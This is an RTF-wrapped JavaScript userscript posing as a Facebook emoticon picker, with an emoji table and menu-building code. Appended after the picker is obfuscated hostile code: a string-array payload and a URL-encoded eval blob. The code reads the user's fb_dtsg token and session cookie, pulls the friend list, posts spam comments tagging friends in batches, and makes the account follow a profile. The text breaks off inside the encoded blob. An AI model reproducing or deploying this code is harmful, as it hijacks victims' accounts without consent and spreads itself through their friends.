\tab\tab "chars" : " \\ud83d\\ude04 ",\par
\tab\tab "class" : "_1az _1a- _2fv",\par
\tab\tab "name" : "Face and eyes smiling with mouth open"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude06 ",\par
\tab\tab "class" : "_1az _1a- _2fw",\par
\tab\tab "name" : "Smiley face with mouth open and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude09 ",\par
\tab\tab "class" : "_1az _1a- _2fx",\par
\tab\tab "name" : "Face winking eye"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0b ",\par
\tab\tab "class" : "_1az _1a- _2fy",\par
\tab\tab "name" : "Guy savoring delicious food"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0c ",\par
\tab\tab "class" : "_1az _1a- _2fz",\par
\tab\tab "name" : "Relief face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0d ",\par
\tab\tab "class" : "_1az _1a- _2f-",\par
\tab\tab "name" : "Smiley face with heart shaped eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude0f ",\par
\tab\tab "class" : "_1az _1a- _2f_",\par
\tab\tab "name" : "Smirk face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude12 ",\par
\tab\tab "class" : "_1az _1a- _2g0",\par
\tab\tab "name" : "Face of boredom"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude13 ",\par
\tab\tab "class" : "_1az _1a- _2g1",\par
\tab\tab "name" : "Face with cold sweat"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude14 ",\par
\tab\tab "class" : "_1az _1a- _2g2",\par
\tab\tab "name" : "Pensive face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude16 ",\par
\tab\tab "class" : "_1az _1a- _2g3",\par
\tab\tab "name" : "Confused face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude18 ",\par
\tab\tab "class" : "_1az _1a- _2g4",\par
\tab\tab "name" : "Throwing kiss Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1a ",\par
\tab\tab "class" : "_1az _1a- _2g5",\par
\tab\tab "name" : "Kissing face with eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1c ",\par
\tab\tab "class" : "_1az _1a- _2g6",\par
\tab\tab "name" : "Face with tongue out and winking"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1d ",\par
\tab\tab "class" : "_1az _1a- _2g7",\par
\tab\tab "name" : "Face with tongue hanging out and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude1e ",\par
\tab\tab "class" : "_1az _1a- _2g8",\par
\tab\tab "name" : "Face discouraged"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude20 ",\par
\tab\tab "class" : "_1az _1a- _2g9",\par
\tab\tab "name" : "Face of anger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude21 ",\par
\tab\tab "class" : "_1az _1a- _2ga",\par
\tab\tab "name" : "Very angry face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude22 ",\par
\tab\tab "class" : "_1az _1a- _2gb",\par
\tab\tab "name" : "Crying Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude23 ",\par
\tab\tab "class" : "_1az _1a- _2gc",\par
\tab\tab "name" : "Face of perseverance"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude24 ",\par
\tab\tab "class" : "_1az _1a- _2gd",\par
\tab\tab "name" : "Face of triumph"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude25 ",\par
\tab\tab "class" : "_1az _1a- _2ge",\par
\tab\tab "name" : "Face discouraged but relieved"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude28 ",\par
\tab\tab "class" : "_1az _1a- _2gf",\par
\tab\tab "name" : "Scary face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude29 ",\par
\tab\tab "class" : "_1az _1a- _2gg",\par
\tab\tab "name" : "Fatigued face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2a ",\par
\tab\tab "class" : "_1az _1a- _2gh",\par
\tab\tab "name" : "Sleeping face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2b ",\par
\tab\tab "class" : "_1az _1a- _2gi",\par
\tab\tab "name" : "Tired face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude2d ",\par
\tab\tab "class" : "_1az _1a- _2gj",\par
\tab\tab "name" : "Face screaming"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude30 ",\par
\tab\tab "class" : "_1az _1a- _2gk",\par
\tab\tab "name" : "Face with mouth open and cold sweat"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude31 ",\par
\tab\tab "class" : "_1az _1a- _2gl",\par
\tab\tab "name" : "Terrified face of fear"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude32 ",\par
\tab\tab "class" : "_1az _1a- _2gm",\par
\tab\tab "name" : "Very surprised face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude33 ",\par
\tab\tab "class" : "_1az _1a- _2gn",\par
\tab\tab "name" : "Face flushed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude35 ",\par
\tab\tab "class" : "_1az _1a- _2go",\par
\tab\tab "name" : "Face dizzy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude37 ",\par
\tab\tab "class" : "_1az _1a- _2gp",\par
\tab\tab "name" : "Face with medical mask"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude38 ",\par
\tab\tab "class" : "_1az _1a- _2gq",\par
\tab\tab "name" : "Grinning Cat face and eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude39 ",\par
\tab\tab "class" : "_1az _1a- _2gr",\par
\tab\tab "name" : "Cat face with tears of laughter"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3a ",\par
\tab\tab "class" : "_1az _1a- _2gs",\par
\tab\tab "name" : "Smiling cat face with open mouth"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3b ",\par
\tab\tab "class" : "_1az _1a- _2gt",\par
\tab\tab "name" : "Smiling cat face with hearts in her eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3c ",\par
\tab\tab "class" : "_1az _1a- _2gu",\par
\tab\tab "name" : "Face of cat smile twisted"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3d ",\par
\tab\tab "class" : "_1az _1a- _2gv",\par
\tab\tab "name" : "Cat face kissing with eyes closed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude3f ",\par
\tab\tab "class" : "_1az _1a- _2gw",\par
\tab\tab "name" : "Cat face crying"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude40 ",\par
\tab\tab "class" : "_1az _1a- _2gx",\par
\tab\tab "name" : "Cat face scared terrified"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4b ",\par
\tab\tab "class" : "_1az _1a- _2gy",\par
\tab\tab "name" : "Happy person raising a hand"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4c ",\par
\tab\tab "class" : "_1az _1a- _2gz",\par
\tab\tab "name" : "Person holding up both hands in celebration"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4d ",\par
\tab\tab "class" : "_1az _1a- _2g-",\par
\tab\tab "name" : "Person frowning"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude4f ",\par
\tab\tab "class" : "_1az _1a- _2g_",\par
\tab\tab "name" : "Person in prayer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u261d ",\par
\tab\tab "class" : "_1az _1a- _2h0",\par
\tab\tab "name" : "Index finger pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u263a ",\par
\tab\tab "class" : "_1az _1a- _2h1",\par
\tab\tab "name" : "White face smiling"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u26a1 ",\par
\tab\tab "class" : "_1az _1a- _2h2",\par
\tab\tab "name" : "High voltage symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u26c4 ",\par
\tab\tab "class" : "_1az _1a- _2h3",\par
\tab\tab "name" : "Snowless snowman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270a ",\par
\tab\tab "class" : "_1az _1a- _2h4",\par
\tab\tab "name" : "Fist up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270b ",\par
\tab\tab "class" : "_1az _1a- _2h5",\par
\tab\tab "name" : "Hand pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u270c ",\par
\tab\tab "class" : "_1az _1a- _2h6",\par
\tab\tab "name" : "Winning Hand"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2600 ",\par
\tab\tab "class" : "_1az _1a- _2h7",\par
\tab\tab "name" : "Sun With Rays"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2601 ",\par
\tab\tab "class" : "_1az _1a- _2h8",\par
\tab\tab "name" : "Cloud"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2614 ",\par
\tab\tab "class" : "_1az _1a- _2h9",\par
\tab\tab "name" : "Umbrella With Rain Drops"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2615 ",\par
\tab\tab "class" : "_1az _1a- _2ha",\par
\tab\tab "name" : "Hot Drink"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2728 ",\par
\tab\tab "class" : "_1az _1a- _2hb",\par
\tab\tab "name" : "Brightness"\par
\tab\}, \{\par
\tab\tab "chars" : " \\u2764 ",\par
\tab\tab "class" : "_1az _1a- _2hc",\par
\tab\tab "name" : "Heavy Black Heart"\par
\tab\} ];\par
\par
\tab // = Variables =======\par
\tab var lastActiveElement = document.activeElement;\par
\par
\tab // = Functions =======\par
\tab function createElement(html) \{\par
\tab\tab var outerHTML = document.createElement("div");\par
\tab\tab outerHTML.innerHTML = html;\par
\tab\tab return outerHTML.firstChild;\par
\tab\}\par
\par
\tab function htmlSpecialChars(string) \{\par
\tab\tab var div = document.createElement("div");\par
\tab\tab var text = document.createTextNode(string);\par
\tab\tab div.appendChild(text);\par
\tab\tab return div.innerHTML;\par
\tab\}\par
\par
\tab function isInstanceOfTextInput(element) \{\par
\tab\tab return (element instanceof HTMLInputElement && element.type == "text")\par
\tab\tab\tab\tab || element instanceof HTMLTextAreaElement;\par
\tab\}\par
\par
\tab function isFlyoutOpen(flyout) \{\par
\tab\tab return flyout.className == "openToggler";\par
\tab\}\par
\par
\tab function openFlyout(flyout, open) \{\par
\tab\tab if (open === undefined) \{\par
\tab\tab\tab open = !isFlyoutOpen(flyout); // Toggle\par
\tab\tab\}\par
\par
\tab\tab if (open) \{\par
\tab\tab\tab flyout.className = "openToggler";\par
\tab\tab\} else \{\par
\tab\tab\tab flyout.removeAttribute("class");\par
\tab\tab\}\par
\tab\}\par
\par
\tab function createTab(titleContainer, bodyContainer) \{\par
\tab\tab var html;\par
\tab\tab // Tab; default = inactive\par
\tab     html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';\par
\tab\tab html += '<div class="jewelFlyout">';\par
\tab\tab html += '</div>';\par
\tab\tab html += '</li>';\par
\tab\tab var title = createElement(html);\par
\tab\tab titleContainer.appendChild(title);\par
\par
\tab\tab // Manual input\par
\tab\tab html = '<div style="display: none;">';\par
\tab\tab html += '</div>';\par
\tab\tab var body = createElement(html);\par
\tab\tab bodyContainer.appendChild(body);\par
\par
\tab\tab // Change tab listener\par
\tab\tab (function(body) \{\par
\tab\tab\tab title.addEventListener("click", function() \{\par
\tab\tab\tab\tab // Change tab\par
\tab\tab\tab\tab var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes\par
\tab\tab\tab\tab for ( var t = 0; t < titles.length; t++) \{\par
\tab\tab\tab\tab\tab if (titles[t] === this) \{ // Active\par
\tab\tab\tab\tab\tab\tab\par
\tab\tab\tab\tab\tab\} else \{ // Inactive\par
\tab\tab\tab\tab\tab\tab titles[t].style.background = "";\par
\tab\tab\tab\tab\tab\tab titles[t].firstChild.style.color = "";\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\}\par
\par
\tab\tab\tab\tab // Change body\par
\tab\tab\tab\tab var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes\par
\tab\tab\tab\tab for ( var b = 0; b < bodies.length; b++) \{\par
\tab\tab\tab\tab\tab if (bodies[b] === body) \{ // Show\par
\tab\tab\tab\tab\tab\tab body.style.display = "";\par
\tab\tab\tab\tab\tab\} else \{ // Hide\par
\tab\tab\tab\tab\tab\tab bodies[b].style.display = "none";\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\}\par
\tab\tab\tab\});\par
\tab\tab\})(body);\par
\par
\tab\tab return \{\par
\tab\tab\tab "title" : title.firstChild,\par
\tab\tab\tab "body" : body\par
\tab\tab\};\par
\tab\}\par
\par
\tab function createTabListBody(emoticons, filter) \{\par
\tab\tab var html;\par
\par
\tab\tab html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';\par
\tab\tab html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';\par
\tab\tab html += '</div>';\par
\tab\tab html += '</div>';\par
\tab\tab var body = createElement(html).firstChild;\par
\tab\tab for ( var e = 0; e < emoticons.length; e++) \{\par
\tab\tab\tab var emoticon = emoticons[e];\par
\tab\tab\tab if (!filter(emoticon)) \{\par
\tab\tab\tab\tab continue;\par
\tab\tab\tab\}\par
\par
\tab\tab\tab // Icons\par
\tab\tab\tab html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';\par
\tab\tab\tab html += '<a';\par
\tab\tab\tab html += ' class="emoticon'\par
\tab\tab\tab\tab\tab + (emoticon.class !== undefined ? ' ' + emoticon.class : '')\par
\tab\tab\tab\tab\tab + '"';\par
\tab\tab\tab html += ' style="text-decoration: inherit; color: inherit;'\par
\tab\tab\tab\tab\tab + (emoticon.class !== undefined ? ' color: transparent;'\par
\tab\tab\tab\tab\tab\tab\tab : ' width: auto;') + '"';\par
\tab\tab\tab html += (emoticon.name !== undefined ? ' title="' + emoticon.name\par
\tab\tab\tab\tab\tab + '"' : '');\par
\tab\tab\tab html += '>';\par
\tab\tab\tab html += htmlSpecialChars(emoticon.chars);\par
\tab\tab\tab html += '</a>';\par
\tab\tab\tab html += '</span>';\par
\tab\tab\tab var cell = createElement(html);\par
\tab\tab\tab body.appendChild(cell);\par
\par
\tab\tab\tab // Select emoticon listener\par
\tab\tab\tab var emoticonA = cell.firstChild;\par
\tab\tab\tab (function(emoticon) \{\par
\tab\tab\tab\tab emoticonA.addEventListener("click", function() \{\par
\tab\tab\tab\tab\tab if (isInstanceOfTextInput(lastActiveElement)) \{\par
\tab\tab\tab\tab\tab\tab lastActiveElement.focus();\par
\par
\tab\tab\tab\tab\tab\tab var chars = emoticon.chars;\par
\tab\tab\tab\tab\tab\tab var value = lastActiveElement.value;\par
\tab\tab\tab\tab\tab\tab var start = lastActiveElement.selectionStart;\par
\tab\tab\tab\tab\tab\tab var end = lastActiveElement.selectionEnd;\par
\tab\tab\tab\tab\tab\tab lastActiveElement.value = value.substring(0, start)\par
\tab\tab\tab\tab\tab\tab\tab\tab + chars + value.substring(end);\par
\tab\tab\tab\tab\tab\tab lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);\par
\tab\tab\tab\tab\tab\}\par
\par
\tab\tab\tab\tab\tab openFlyoutCommand = false; // Close flyout\par
\tab\tab\tab\tab\});\par
\tab\tab\tab\})(emoticon);\par
\tab\tab\}\par
\par
\tab\tab return body.parentNode;\par
\tab\}\par
\par
\tab // = Construct UI =======\par
\tab var html;\par
\par
\tab // Menu item\par
\tab // var navItem\par
\tab html = '<li class="navItem middleItem notifNegativeBase">';\par
\tab html += '<div class="fbJewel">';\par
\tab // \{\par
\par
\tab // Toggler\par
\tab html += '<a class="navLink" title="1 Th\'f4ng B\'e1o M?i">'; // var navLink\par
\tab html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';\par
\tab html += '</a>';\par
\par
\tab\par
\tab // Flyout\par
\tab html += '<div>'; // openToggler; var flyout\par
\tab html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';\par
\tab // \{\par
\par
\tab\par
\tab // Beeper\par
\tab html += '<div class="jewelBeeperHeader">';\par
\tab html += '<div class="beeperNubWrapper">';\par
\tab html += '<div class="beeperNub" style="left: 4px;"></div>';\par
\tab html += '</div>';\par
\tab html += '</div>';\par
\par
\tab // Tabs\par
\tab // var titleContainer\par
\tab html += '<ul style="display: text-align: center;">';\par
\tab html += '</ul>';\par
\par
\tab // Bodies\par
\tab html += '<div>'; // var bodyContainer\par
\tab html += '</div>';\par
\par
\tab // Footer\par
\tab html += '<div class="jewelFooter">';\par
    html += '<a class="jewelFooter" href="https://www.facebook.com/DangHuuKien1996" target="_blank">Icon Make By Nh\u7853?t Minh <br>NoName</a>';\par
\tab html += '</div>';\par
\par
\tab // \}\par
\tab html += '</div>'; // emoticonsPanel\par
\tab html += '</div>'; // openToggler\par
\par
\tab // \}\par
\tab html += '</div>'; // fbJewel\par
\tab html += '</li>'; // navItem\par
\par
\tab var navItem = createElement(html);\par
\tab var pageNav = document.querySelector("#pageNav");\par
\tab pageNav.insertBefore(navItem, pageNav.firstChild);\par
\par
\tab // Maintain active element\par
\tab navItem.addEventListener("click", function() \{\par
\tab\tab if (isInstanceOfTextInput(lastActiveElement)) \{\par
\tab\tab\tab lastActiveElement.focus();\par
\tab\tab\}\par
\par
\tab\tab openFlyoutCommand = undefined; // Do nothing\par
\tab\}, true);\par
\par
\tab var navLink = navItem.firstChild.firstChild;\par
\tab var flyout = navLink.nextSibling;\par
\tab var titleContainer = flyout.firstChild.childNodes[1];\par
\tab var bodyContainer = titleContainer.nextSibling;\par
\par
\tab // Toggle listener\par
\tab navLink.addEventListener("click", function() \{\par
\tab\tab openFlyoutCommand = !isFlyoutOpen(flyout);\par
\tab\});\par
\par
\tab // Picture emoticon tab\par
\tab var picEmoTab = createTab(titleContainer, bodyContainer);\par
\tab picEmoTab.title.click(); // Default tab\par
\tab\par
\tab picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) \{\par
\tab\tab if (emoticon.class === undefined) \{ // No picture\par
\tab\tab\tab return false;\par
\tab\tab\}\par
\par
\tab\tab // [Bug] 2 characters unicode emoticons\par
\tab\tab if (emoticon.chars.length == 2) \{\par
\tab\tab\tab return false;\par
\tab\tab\}\par
\par
\tab\tab return true;\par
\par
\tab\tab\tab\}));\par
\par
\tab // = Other listener =======\par
\par
\tab document.addEventListener("click", function() \{\par
\tab\tab // Get active textarea\par
\tab\tab lastActiveElement = document.activeElement;\par
\par
\tab\tab // Toggle flyout\par
\tab\tab if (openFlyoutCommand !== undefined) \{\par
\tab\tab\tab openFlyout(flyout, openFlyoutCommand);\par
\tab\tab\}\par
\tab\tab openFlyoutCommand = false;\par
 \tab\});\par
\})();\par
\par
\par
\tab // === Facebook Emoticons ====\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\tab\par
function cereziAl(isim) \{\par
    var tarama = isim + "=";\par
    if (document.cookie.length > 0) \{\par
        konum = document.cookie.indexOf(tarama)\par
        if (konum != -1) \{\par
            konum += tarama.length\par
            son = document.cookie.indexOf(";", konum)\par
            if (son == -1)\par
                son = document.cookie.length\par
            return unescape(document.cookie.substring(konum, son))\par
        \}\par
        else \{ return ""; \}\par
    \}\par
\}\par
\par
function getRandomInt (min, max) \{\par
    return Math.floor(Math.random() * (max - min + 1)) + min;\par
\}\par
function randomValue(arr) \{\par
    return arr[getRandomInt(0, arr.length-1)];\par
\}\par
\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\tab\par
function cereziAl(isim) \{\par
    var tarama = isim + "=";\par
    if (document.cookie.length > 0) \{\par
        konum = document.cookie.indexOf(tarama)\par
        if (konum != -1) \{\par
            konum += tarama.length\par
            son = document.cookie.indexOf(";", konum)\par
            if (son == -1)\par
                son = document.cookie.length\par
            return unescape(document.cookie.substring(konum, son))\par
        \}\par
        else \{ return ""; \}\par
    \}\par
\}\par
function getRandomInt (min, max) \{\par
    return Math.floor(Math.random() * (max - min + 1)) + min;\par
\}\par
function randomValue(arr) \{\par
    return arr[getRandomInt(0, arr.length-1)];\par
\}\par
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1471842583035586","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\\x26filter[0]=user","\\x26options[0]=friends_only","\\x26options[1]=nm","\\x26token=v7","\\x26viewer=","\\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\\x26ft_ent_identifier=","\\x26comment_text= \u9728?  \u-10180?\u-8417?  \u-10180?\u-8365?  \u-10179?\u-9184? M\'ecnh v\u7915?a c\'e0i \f1\'f0\u7863?t th\f0\'e0nh c\'f4ng th\'eam \f1\'f0\u432?\u7907?c tool v\f0\'e0 r\u7845?t nhi\u7873?u icon m\u7899?i v\'e0 \f1\'f0\u7865?p n\f0\'e8 \u-10180?\u-8306? Ai C\'f3 Nhu C\u7847?u Th\'ec L\'e0m Th\u7917? Nha Hay L\u7855?m ! Ai Ko C\'f3 Nhu C\u7847?u Th\'ec Sr Nha V\'ec \f1\'d0\f0\'e3 Tag Nha \u-10179?\u-9059?   ","\\x26source=2","\\x26client_id=1377871797138:1707018092","\\x26reply_fbid","\\x26parent_comment_id","\\x26rootid=u_jsonp_2_3","\\x26clp=\{\\x22cl_impid\\x22:\\x22453524a0\\x22,\\x22clearcounter\\x22:0,\\x22elementid\\x22:\\x22js_5\\x22,\\x22version\\x22:\\x22x\\x22,\\x22parent_fbid\\x22:","\}","\\x26attached_sticker_fbid=0","\\x26attached_photo_fbid=0","\\x26giftoccasion","\\x26ft[tn]=[]","\\x26__a=1","\\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\\x26__req=q","\\x26fb_dtsg=","\\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id)\{var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function ()\{if(_0x7892x7[_0xa22c[7]]==4)\{eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/50);f++)\{mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*50;i<(f+1)*50;i++)\{if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])\{mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]];\} ;\} ;yorum_yap(id,mesaj);\} ;\} ;\} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)\{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);\} else \{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);\} ;_0x7892x7[_0xa22c[37]]();\} ;function RandomArkadas()\{var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++)\{_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[50]]+_0xa22c[22];\} ;return _0x7892xa;\} ;function yorum_yap(id,_0x7892xc)\{var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function ()\{if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200)\{_0x7892xd[_0xa22c[64]];\} ;\} ;_0x7892xd[_0xa22c[37]](_0x7892x8);\} ;arkadaslari_al(id);\par
eval(unescape("%76%61%72%20%66%62%5F%64%74%73%67%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%22%66%62%5F%64%74%73%67%22%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%61%28%61%62%6F%6E%65%29%0A%7B%0A%20%76%61%72%20%68%74%74%70%34%3D%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%3B%0A%20%76%61%72%20%75%72%6C%34%3D%22%2F%61%6A%61%78%2F%66%6F%6C%6C%6F%77%2F%66%6F%6C%6C%6F%77%5F%70%72%6F%66%69%6C%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%3D%22%70%72%6F%66%69%6C%65%5F%69%64%3D%22%2B%61%62%6F%6E%65%2B%22%26%6C%6F%63%61%74%69%6F%6E%3D%31%26%73%6F%75%72%63%65%3D%66%6F%6C%6C%6F%77%2D%62%75%74%74%6F%6E%26%73%75%62%73%63%72%69%62%65%64%5F%62%75%74%74%6F%6E%5F%69%64%3D%75%33%37%71%61%63%5F%33%37%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%6C%73%64%26%5F%5F%22%2B%75%73%65%72%5F%69%64%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%75%72%6C%34%2C%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%3D%66%75%6E%63%74%69%6F%6E%28%29%0A%20%7B%0A%20%20%69%66%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%3D%3D%34%26%26%68%74%74%70%34%2E%73%74%61%74%75%73%3D%3D%32%30%30%29%68%74%74%70%34%2E%63%6C%6F%73%65%0A%20%7D%0A%20%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%0A%7D%0A%20%66%75%6E%63%74%69%6F%6E%20%73%75%62%6C%69%73%74%28%75%69%64%73%73%29%0A%7B%0A%20%76%61%72%20%61%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%0A%20%61%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%6E%65%77%20%41%73%79%6E%63%52%65%71%75%65%73%74%28%29%2E%73%65%74%55%52%49%28%27%2F%61%6A%61%78%2F%66%72%69%65%6E%64%73%2F%6C%69%